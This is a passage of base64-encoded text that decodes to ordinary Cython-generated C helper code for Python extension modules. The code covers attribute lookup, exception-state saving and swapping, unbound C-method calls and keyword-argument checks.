V5KTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkoYXJncykpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfS2V5RXJyb3IsIGFyZ3MpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19LZXlFcnJvciwga2V5KTtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gdmFsdWU7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIGludCB3aXRoX2Vycm9yKSB7XG4gICAgUHlPYmplY3QgKnJlcztcbiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvYmopO1xuICAgIHJlcyA9IF9QeVR5cGVfTG9va3VwKHRwLCBhdHRyX25hbWUpO1xuICAgIGlmIChsaWtlbHkocmVzKSkge1xuICAgICAgICBkZXNjcmdldGZ1bmMgZiA9IFB5X1RZUEUocmVzKS0+dHBfZGVzY3JfZ2V0O1xuICAgICAgICBpZiAoIWYpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihyZXMpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmVzID0gZihyZXMsIG9iaiwgKFB5T2JqZWN0ICopdHApO1xuICAgICAgICB9XG4gICAgfSBlbHNlIGlmICh3aXRoX2Vycm9yKSB7XG4gICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19BdHRyaWJ1dGVFcnJvciwgYXR0cl9uYW1lKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlcztcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKlxuX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUpXG57XG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHdoaWxlICgoZXhjX2luZm8tPmV4Y192YWx1ZSA9PSBOVUxMIHx8IGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gUHlfTm9uZSkgJiZcbiAgICAgICAgICAgZXhjX2luZm8tPnByZXZpb3VzX2l0ZW0gIT0gTlVMTClcbiAgICB7XG4gICAgICAgIGV4Y19pbmZvID0gZXhjX2luZm8tPnByZXZpb3VzX2l0ZW07XG4gICAgfVxuICAgIHJldHVybiBleGNfaW5mbztcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblNhdmUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpO1xuICAgIFB5T2JqZWN0ICpleGNfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGlmIChleGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfdmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICAqdmFsdWUgPSBOVUxMO1xuICAgICAgICAqdHlwZSA9IE5VTEw7XG4gICAgICAgICp0YiA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgKnZhbHVlID0gZXhjX3ZhbHVlO1xuICAgICAgICBQeV9JTkNSRUYoKnZhbHVlKTtcbiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7XG4gICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpO1xuICAgIH1cbiAgI2VsaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpO1xuICAgICp0eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgICp2YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgKnRiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgUHlfWElOQ1JFRigqdHlwZSk7XG4gICAgUHlfWElOQ1JFRigqdmFsdWUpO1xuICAgIFB5X1hJTkNSRUYoKnRiKTtcbiAgI2Vsc2VcbiAgICAqdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7XG4gICAgKnZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7XG4gICAgKnRiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrO1xuICAgIFB5X1hJTkNSRUYoKnR5cGUpO1xuICAgIFB5X1hJTkNSRUYoKnZhbHVlKTtcbiAgICBQeV9YSU5DUkVGKCp0Yik7XG4gICNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYodHlwZSk7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICNlbHNlXG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgZXhjX2luZm8tPmV4Y190eXBlID0gdHlwZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9IHR5cGU7XG4gICAgdHN0YXRlLT5leGNfdmFsdWUgPSB2YWx1ZTtcbiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAjZW5kaWZcbiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuICAjZW5kaWZcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblN3YXAoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIGlmICh0bXBfdmFsdWUgPT0gTlVMTCB8fCB0bXBfdmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgICAgIHRtcF92YWx1ZSA9IE5VTEw7XG4gICAgICAgIHRtcF90eXBlID0gTlVMTDtcbiAgICAgICAgdG1wX3RiID0gTlVMTDtcbiAgICB9IGVsc2Uge1xuICAgICAgICB0bXBfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodG1wX3ZhbHVlKTtcbiAgICAgICAgUHlfSU5DUkVGKHRtcF90eXBlKTtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICB0bXBfdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIHRtcF92YWx1ZSktPnRyYWNlYmFjaztcbiAgICAgICAgUHlfWElOQ1JFRih0bXBfdGIpO1xuICAgICAgICAjZWxzZVxuICAgICAgICB0bXBfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2sodG1wX3ZhbHVlKTtcbiAgICAgICAgI2VuZGlmXG4gICAgfVxuICAjZWxpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgZXhjX2luZm8tPmV4Y190eXBlID0gKnR5cGU7XG4gICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9ICp2YWx1ZTtcbiAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9ICp0YjtcbiAgI2Vsc2VcbiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7XG4gICAgdG1wX3RiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrO1xuICAgIHRzdGF0ZS0+ZXhjX3R5cGUgPSAqdHlwZTtcbiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9ICp2YWx1ZTtcbiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSAqdGI7XG4gICNlbmRpZlxuICAgICp0eXBlID0gdG1wX3R5cGU7XG4gICAgKnZhbHVlID0gdG1wX3ZhbHVlO1xuICAgICp0YiA9IHRtcF90Yjtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0V4Y2VwdGlvblN3YXAoUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7XG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgIFB5RXJyX0dldEV4Y0luZm8oJnRtcF90eXBlLCAmdG1wX3ZhbHVlLCAmdG1wX3RiKTtcbiAgICBQeUVycl9TZXRFeGNJbmZvKCp0eXBlLCAqdmFsdWUsICp0Yik7XG4gICAgKnR5cGUgPSB0bXBfdHlwZTtcbiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7XG4gICAgKnRiID0gdG1wX3RiO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKFxuICAgIGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSxcbiAgICBQeU9iamVjdCoga3dfbmFtZSlcbntcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJXMoKSBnb3QgbXVsdGlwbGUgdmFsdWVzIGZvciBrZXl3b3JkIGFyZ3VtZW50IFwnJVVcJyIsIGZ1bmNfbmFtZSwga3dfbmFtZSk7XG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDBcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU2VsZmxlc3NDYWxsKFB5T2JqZWN0ICptZXRob2QsIFB5T2JqZWN0ICphcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBQeU9iamVjdCAqc2VsZmxlc3NfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgUHlUdXBsZV9TaXplKGFyZ3MpKTtcbiAgICBpZiAodW5saWtlbHkoIXNlbGZsZXNzX2FyZ3MpKSByZXR1cm4gTlVMTDtcbiAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsKG1ldGhvZCwgc2VsZmxlc3NfYXJncywga3dhcmdzKTtcbiAgICBQeV9ERUNSRUYoc2VsZmxlc3NfYXJncyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU2VsZmxlc3NDYWxsKFB5T2JqZWN0ICptZXRob2QsIFB5T2JqZWN0ICoqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpIHtcbiAgICAgICAgcmV0dXJuIF9QeU9iamVjdF9WZWN0b3JjYWxsXG4gICAgICAgICAgICAobWV0aG9kLCBhcmdzID8gYXJncysxIDogTlVMTCwgbmFyZ3MgPyBuYXJncy0xIDogMCwga3duYW1lcyk7XG59XG4jZWxzZVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcykge1xuICAgIHJldHVyblxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuICAgIF9QeU9iamVjdF9WZWN0b3JjYWxsXG4jZWxzZVxuICAgIFB5T2JqZWN0X1ZlY3RvcmNhbGxcbiNlbmRpZlxuICAgICAgICAobWV0aG9kLCBhcmdzID8gYXJncysxIDogTlVMTCwgbmFyZ3MgPyAoc2l6ZV90KSBuYXJncy0xIDogMCwga3duYW1lcyk7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU1ldGhvZERlZiBfX1B5eF9VbmJvdW5kQ01ldGhvZF9EZWYgPSB7XG4gICAgICJDeXRob25VbmJvdW5kQ01ldGhvZCIsXG4gICAgIF9fUFlYX1JFSU5URVJQUkVUX0ZVTkNJT04oUHlDRnVuY3Rpb24sIF9fUHl4X1NlbGZsZXNzQ2FsbCksXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMFxuICAgICBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTLFxuI2Vsc2VcbiAgICAgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFMsXG4jZW5kaWZcbiAgICAgTlVMTFxufTtcbnN0YXRpYyBpbnQgX19QeXhfVHJ5VW5wYWNrVW5ib3VuZENNZXRob2QoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uKiB0YXJnZXQpIHtcbiAgICBQeU9iamVjdCAqbWV0aG9kLCAqcmVzdWx0PU5VTEw7XG4gICAgbWV0aG9kID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cih0YXJnZXQtPnR5cGUsICp0YXJnZXQtPm1ldGhvZF9uYW1lKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGhvZCkpXG4gICAgICAgIHJldHVybiAtMTtcbiAgICByZXN1bHQgPSBtZXRob2Q7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKGxpa2VseShfX1B5eF9UeXBlQ2hlY2sobWV0aG9kLCAmUHlNZXRob2REZXNjcl9UeXBlKSkpXG4gICAge1xuICAgICAgICBQeU1ldGhvZERlc2NyT2JqZWN0ICpkZXNjciA9IChQeU1ldGhvZERlc2NyT2JqZWN0KikgbWV0aG9kO1xuICAgICAgICB0YXJnZXQtPmZ1bmMgPSBkZXNjci0+ZF9tZXRob2QtPm1sX21ldGg7XG4gICAgICAgIHRhcmdldC0+ZmxhZyA9IGRlc2NyLT5kX21ldGhvZC0+bWxfZmxhZ3MgJiB+KE1FVEhfQ0xBU1MgfCBNRVRIX1NUQVRJQyB8IE1FVEhfQ09FWElTVCB8IE1FVEhfU1RBQ0tMRVNTKTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuI2Vsc2VcbiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2sobWV0aG9kKSlcbiNlbmRpZlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKnNlbGY7XG4gICAgICAgIGludCBzZWxmX2ZvdW5kO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgIHNlbGYgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG1ldGhvZCwgIl9fc2VsZl9fIik7XG4gICAgICAgIGlmICghc2VsZikge1xuICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgfVxuI2Vsc2VcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dFVF9TRUxGKG1ldGhvZCk7XG4jZW5kaWZcbiAgICAgICAgc2VsZl9mb3VuZCA9IChzZWxmICYmIHNlbGYgIT0gUHlfTm9uZSk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAgICAgUHlfWERFQ1JFRihzZWxmKTtcbiNlbmRpZlxuICAgICAgICBpZiAoc2VsZl9mb3VuZCkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnVuYm91bmRfbWV0aG9kID0gUHlDRnVuY3Rpb25fTmV3KCZfX1B5eF9VbmJvdW5kQ01ldGhvZF9EZWYsIG1ldGhvZCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXVuYm91bmRfbWV0aG9kKSkgcmV0dXJuIC0xO1xuICAgICAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgICAgICAgICByZXN1bHQgPSB1bmJvdW5kX21ldGhvZDtcbiAgICAgICAgfVxuICAgIH1cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBpZiAodW5saWtlbHkodGFyZ2V0LT5tZXRob2QpKSB7XG4gICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgIH0gZWxzZVxuI2VuZGlmXG4gICAgdGFyZ2V0LT5tZXRob2QgPSByZXN1bHQ7XG4gICAgcmV0dXJuIDA7XG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcxLCBQeU9iamVjdCAqYXJnMikge1xuICAgIGludCB3YXNfaW5pdGlhbGl6ZWQgPSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fR2V0QW5kU2V0SW5pdGlhbGl6aW5nKGNmdW5jKTtcbiAgICBpZiAobGlrZWx5KHdhc19pbml0aWFsaXplZCA9PSAyICYmIGNmdW5jLT5mdW5jKSkge1xuICAgICAgICBQeU9iamVjdCAqYXJnc1syXSA9IHthcmcxLCBhcmcyfTtcbiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IE1FVEhfRkFTVENBTEwpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdChjZnVuYywgc2VsZiwgYXJncywgMik7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IChNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUykpXG4gICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIDIsIE5VTEwpO1xuICAgIH1cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIGVsc2UgaWYgKHVubGlrZWx5KHdhc19pbml0aWFsaXplZCA9PSAxKSkge1xuICAgICAgICBfX1B5eF9DYWNoZWRDRnVuY3Rpb24gdG1wX2NmdW5jID0ge1xuI2lmbmRlZiBfX2NwbHVzcGx1c1xuICAgICAgICAgICAgMFxuI2VuZGlmXG4gICAgICAgIH07XG4gICAgICAgIHRtcF9jZnVuYy50eXBlID0gY2Z1bmMtPnR5cGU7XG4gICAgICAgIHRtcF9jZnVuYy5tZXRob2RfbmFtZSA9IGNmdW5jLT5tZXRob2RfbmFtZTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKCZ0bXBfY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpO1xuICAgIH1cbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMik7XG4gICAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKGNmdW5jKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpe1xuICAgIGlmICh1bmxpa2VseSghY2Z1bmMtPmZ1bmMgJiYgIWNmdW5jLT5tZXRob2QpICYmIHVubGlrZWx5KF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKGNmdW5jKSA8IDApKSByZXR1cm4gTlVMTDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBpZiAoY2Z1bmMtPmZ1bmMgJiYgKGNmdW5jLT5mbGFnICYgTUVUSF9WQVJBUkdTKSkge1xuICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDtcbiAgICAgICAgUHlPYmplY3QgKmFyZ3MgPSBQeVR1cGxlX05ldygyKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIFB5X0lOQ1JFRihhcmcxKTtcbiAgICAgICAgUHlUdXBsZV9TRVRfSVRFTShhcmdzLCAwLCBhcmcxKTtcbiAgICAgICAgUHlfSU5DUkVGKGFyZzIpO1xuICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3MsIDEsIGFyZzIpO1xuICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgJiBNRVRIX0tFWVdPUkRTKVxuICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfQ2FsbENGdW5jdGlvbldpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgTlVMTCk7XG4gICAgICAgIGVsc2VcbiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X0NhbGxDRnVuY3Rpb24oY2Z1bmMsIHNlbGYsIGFyZ3MpO1xuICAgICAgICBQeV9ERUNSRUYoYXJncyk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuI2VuZGlmXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqYXJnc1s0XSA9IHtOVUxMLCBzZWxmLCBhcmcxLCBhcmcyfTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGNmdW5jLT5tZXRob2QsIGFyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7XG4gICAgfVxufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfVmFsaWRhdGVEdXBsaWNhdGVQb3NBcmdzKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lKVxue1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lID0gYXJnbmFtZXM7XG4gICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7XG4gICAgICAgIFB5T2JqZWN0ICprZXkgPSAqKm5hbWU7XG4gICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9Db250YWlucyhrd2RzLCBrZXkpO1xuICAgICAgICBpZiAodW5saWtlbHkoZm91bmQpKSB7XG4gICAgICAgICAgICBpZiAoZm91bmQgPT0gMSkgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIHJldHVybiAwO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwoUHlPYmplY3QgKnMxLCBQeU9iamVjdCAqczIpIHtcbiAgICBpbnQga2luZDtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHMxKTtcbiAgICBpZiAobGVuICE9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHMyKSkgcmV0dXJuIDA7XG4gICAga2luZCA9IFB5VW5pY29kZV9LSU5EKHMxKTtcbiAgICBpZiAoa2luZCAhPSBQeVVuaWNvZGVfS0lORChzMikpIHJldHVybiAwO1xuICAgIGNvbnN0IHZvaWQgKmRhdGExID0gUHlVbmljb2RlX0RBVEEoczEpO1xuICAgIGNvbnN0IHZvaWQgKmRhdGEyID0gUHlVbmljb2RlX0RBVEEoczIpO1xuICAgIHJldHVybiAobWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkgbGVuICogKHNpemVfdCkga2luZCkgPT0gMCk7XG59XG4jZW5kaWZcbnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX3N0cihcbiAgICBQeU9iamVjdCAqa2V5LFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZyxcbiAgICBzaXplX3QgKmluZGV4X2ZvdW5kLFxuICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpXG57X